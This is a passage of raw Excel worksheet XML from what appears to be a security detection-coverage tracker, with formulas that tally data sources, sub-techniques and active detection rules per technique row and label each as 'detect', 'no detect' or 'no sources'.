        <f t="array" ref="M207">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N207" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O207" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P207" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S20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07" t="s">
        <v>368</v>
      </c>
      <c r="U207" t="s">
        <v>1189</v>
      </c>
      <c r="V207" t="s">
        <v>1190</v>
      </c>
      <c r="W207" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="208" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A208" t="s">
        <v>1191</v>
      </c>
      <c r="B208" t="s">
        <v>1191</v>
      </c>
      <c r="C208" t="s">
        <v>60</v>
      </c>
      <c r="D208" t="s">
        <v>11</v>
      </c>
      <c r="E208" t="s">
        <v>367</v>
      </c>
      <c r="F208" s="9">
        <f t="shared" si="3"/>
        <v>1</v>
      </c>
      <c r="G208" s="9" cm="1">
        <f t="array" ref="G208">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H208" s="9" cm="1">
        <f t="array" ref="H208">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I208" s="9" t="str" cm="1">
        <f t="array" ref="I208">IF(SUM(IF($C208=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C208=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J208" s="9" cm="1">
        <f t="array" ref="J20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208" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M208" s="9" cm="1">
        <f t="array" ref="M208">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N208" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O208" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P208" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S20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08" t="s">
        <v>368</v>
      </c>
      <c r="U208" t="s">
        <v>1192</v>
      </c>
      <c r="V208" t="s">
        <v>370</v>
      </c>
      <c r="W208" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="209" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A209" t="s">
        <v>1191</v>
      </c>
      <c r="B209" t="s">
        <v>1193</v>
      </c>
      <c r="C209" t="s">
        <v>1194</v>
      </c>
      <c r="D209" t="s">
        <v>11</v>
      </c>
      <c r="E209" t="s">
        <v>367</v>
      </c>
      <c r="F209" s="9">
        <f t="shared" si="3"/>
        <v>1</v>
      </c>
      <c r="G209" s="9" cm="1">
        <f t="array" ref="G209">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H209" s="9" t="str" cm="1">
        <f t="array" ref="H209">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I209" s="9" t="str" cm="1">
        <f t="array" ref="I209">IF(SUM(IF($C209=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C209=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J209" s="9" t="str" cm="1">
        <f t="array" ref="J20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09" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M209" s="9" cm="1">
        <f t="array" ref="M209">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N209" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O209" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P209" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S20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09" t="s">
        <v>368</v>
      </c>
      <c r="U209" t="s">
        <v>1195</v>
      </c>
      <c r="V209" t="s">
        <v>374</v>
      </c>
      <c r="W209" t="b">
        <v>1</v>
      </c>
      <c r="X209" t="s">
        <v>1191</v>
      </c>
    </row>
    <row r="210" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A210" t="s">
        <v>1191</v>
      </c>
      <c r="B210" t="s">
        <v>1196</v>
      </c>
      <c r="C210" t="s">
        <v>1197</v>
      </c>
      <c r="D210" t="s">
        <v>11</v>
      </c>
      <c r="E210" t="s">
        <v>367</v>
      </c>
      <c r="F210" s="9">
        <f t="shared" si="3"/>
        <v>1</v>
      </c>
      <c r="G210" s="9" cm="1">
        <f t="array" ref="G210">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H210" s="9" t="str" cm="1">
        <f t="array" ref="H210">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I210" s="9" t="str" cm="1">
        <f t="array" ref="I210">IF(SUM(IF($C210=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C210=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J210" s="9" t="str" cm="1">
        <f t="array" ref="J21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10" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M210" s="9" cm="1">
        <f t="array" ref="M210">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N210" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O210" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P210" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S21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10" t="s">
        <v>368</v>
      </c>
      <c r="U210" t="s">
        <v>1198</v>
      </c>
      <c r="V210" t="s">
        <v>374</v>
      </c>
      <c r="W210" t="b">
        <v>1</v>
      </c>
      <c r="X210" t="s">
        <v>1191</v>
      </c>
    </row>
    <row r="211" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A211" t="s">
        <v>1199</v>
      </c>
      <c r="B211" t="s">
        <v>1199</v>
      </c>
      <c r="C211" t="s">
        <v>52</v>
      </c>
      <c r="D211" t="s">
        <v>1200</v>
      </c>
      <c r="E211" t="s">
        <v>1201</v>
      </c>
      <c r="F211" s="9">
        <f t="shared" si="3"/>
        <v>5</v>
      </c>
      <c r="G211" s="9" cm="1">
        <f t="array" ref="G211">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H211" s="9" cm="1">
        <f t="array" ref="H211">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I211" s="9" t="str" cm="1">
        <f t="array" ref="I211">IF(SUM(IF($C211=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C211=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J211" s="9" t="str" cm="1">
        <f t="array" ref="J21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11" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M211" s="9" cm="1">
        <f t="array" ref="M211">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N211" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O211" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P211" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S21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11" t="s">
        <v>598</v>
      </c>
      <c r="U211" t="s">
        <v>1202</v>
      </c>
      <c r="V211" t="s">
        <v>1203</v>
      </c>
      <c r="W211" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="212" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A212" t="s">
        <v>1204</v>
      </c>
      <c r="B212" t="s">
        <v>1204</v>
      </c>
      <c r="C212" t="s">
        <v>31</v>
      </c>
      <c r="D212" t="s">
        <v>747</v>
      </c>
      <c r="E212" t="s">
        <v>1205</v>
      </c>
      <c r="F212" s="9">
        <f t="shared" si="3"/>
        <v>6</v>
      </c>
      <c r="G212" s="9" cm="1">
        <f t="array" ref="G212">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H212" s="9" cm="1">
        <f t="array" ref="H212">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>5</v>
      </c>
      <c r="I212" s="9" t="str" cm="1">
        <f t="array" ref="I212">IF(SUM(IF($C212=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C212=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J212" s="9" cm="1">
        <f t="array" ref="J21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212" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>5</v>
      </c>
      <c r="M212" s="9" cm="1">
        <f t="array" ref="M212">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>5</v>
      </c>
      <c r="N212" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O212" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P212" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S21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12" t="s">
        <v>386</v>
      </c>
      <c r="U212" t="s">
        <v>1206</v>
      </c>
      <c r="V212" t="s">
        <v>1207</v>
      </c>
      <c r="W212" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="213" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A213" t="s">
        <v>1204</v>
      </c>
      <c r="B213" t="s">
        <v>1208</v>
      </c>
      <c r="C213" t="s">
        <v>328</v>
      </c>
      <c r="D213" t="s">
        <v>747</v>
      </c>
      <c r="E213" t="s">
        <v>467</v>
      </c>
      <c r="F213" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G213" s="9" cm="1">
        <f t="array" ref="G213">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H213" s="9" t="str" cm="1">
        <f t="array" ref="H213">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I213" s="9" t="str" cm="1">
        <f t="array" ref="I213">IF(SUM(IF($C213=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C213=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J213" s="9" t="str" cm="1">
        <f t="array" ref="J21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13" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M213" s="9" cm="1">
        <f t="array" ref="M213">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N213" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O213" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P213" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S21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13" t="s">
        <v>386</v>
      </c>
      <c r="U213" t="s">
        <v>1209</v>
      </c>
      <c r="V213" t="s">
        <v>1210</v>
      </c>
      <c r="W213" t="b">
        <v>1</v>
      </c>
      <c r="X213" t="s">
        <v>1204</v>
      </c>
    </row>
    <row r="214" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A214" t="s">
        <v>1204</v>
      </c>
      <c r="B214" t="s">
        <v>1211</v>
      </c>
      <c r="C214" t="s">
        <v>287</v>
      </c>
      <c r="D214" t="s">
        <v>747</v>
      </c>
      <c r="E214" t="s">
        <v>467</v>
      </c>
      <c r="F214" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G214" s="9" cm="1">
        <f t="array" ref="G214">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H214" s="9" t="str" cm="1">
        <f t="array" ref="H214">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I214" s="9" t="str" cm="1">
        <f t="array" ref="I214">IF(SUM(IF($C214=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C214=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J214" s="9" t="str" cm="1">
        <f t="array" ref="J21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14" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M214" s="9" cm="1">
        <f t="array" ref="M214">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N214" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O214" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P214" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S21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14" t="s">
        <v>386</v>
      </c>
      <c r="U214" t="s">
        <v>1212</v>
      </c>
      <c r="V214" t="s">
        <v>1213</v>
      </c>
      <c r="W214" t="b">
        <v>1</v>
      </c>
      <c r="X214" t="s">
        <v>1204</v>
      </c>
    </row>
    <row r="215" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A215" t="s">
        <v>1204</v>
      </c>
      <c r="B215" t="s">
        <v>1214</v>
      </c>
      <c r="C215" t="s">
        <v>1215</v>
      </c>
      <c r="D215" t="s">
        <v>747</v>
      </c>
      <c r="E215" t="s">
        <v>467</v>
      </c>
      <c r="F215" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G215" s="9" cm="1">
        <f t="array" ref="G215">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H215" s="9" t="str" cm="1">
        <f t="array" ref="H215">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I215" s="9" t="str" cm="1">
        <f t="array" ref="I215">IF(SUM(IF($C215=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C215=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J215" s="9" t="str" cm="1">
        <f t="array" ref="J21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15" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M215" s="9" cm="1">
        <f t="array" ref="M215">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N215" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O215" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P215" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S21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15" t="s">
        <v>386</v>
      </c>
      <c r="U215" t="s">
        <v>1216</v>
      </c>
      <c r="V215" t="s">
        <v>1217</v>
      </c>
      <c r="W215" t="b">
        <v>1</v>
      </c>
      <c r="X215" t="s">
        <v>1204</v>
      </c>
    </row>
    <row r="216" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A216" t="s">
        <v>1204</v>
      </c>
      <c r="B216" t="s">
        <v>1218</v>
      </c>
      <c r="C216" t="s">
        <v>1219</v>
      </c>
      <c r="D216" t="s">
        <v>747</v>
      </c>
      <c r="E216" t="s">
        <v>1220</v>
      </c>
      <c r="F216" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G216" s="9" cm="1">
        <f t="array" ref="G216">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H216" s="9" t="str" cm="1">
        <f t="array" ref="H216">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I216" s="9" t="str" cm="1">
        <f t="array" ref="I216">IF(SUM(IF($C216=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C216=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J216" s="9" t="str" cm="1">
        <f t="array" ref="J21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16" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M216" s="9" cm="1">
        <f t="array" ref="M216">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N216" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O216" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P216" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S21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16" t="s">
